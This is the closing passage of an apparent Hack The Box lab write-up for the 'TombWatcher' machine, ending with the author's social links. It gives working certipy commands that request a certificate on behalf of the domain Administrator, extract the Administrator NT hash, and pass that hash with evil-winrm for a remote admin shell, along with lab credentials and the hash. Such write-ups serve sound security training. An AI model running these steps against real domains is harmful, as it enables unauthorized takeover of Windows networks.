certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Passw0rd' -dc-ip '10.10.11.72' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\Administrator'
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*FabFV4KgcGVK9R8YIB7xXA.png" alt="" height="109" width="700"><figcaption></figcaption></figure>

### Step-3 <a href="#b32c" id="b32c"></a>

Authenticate using the obtained certificate, And we successfully get hash:

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xa__tSgdV4VPTFr6w7-obw.png" alt="" height="194" width="700"><figcaption></figcaption></figure>

Now try to get administrator remote access to get root flag.

```
evil-winrm -i 10.10.11.72 -u Administrator -H f61db423bebe3328d33af26741afe5fc
```

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*esshw-UFrnN5lfXP-FjPOQ.png" alt="" height="155" width="700"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#id-8c4a" id="id-8c4a"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
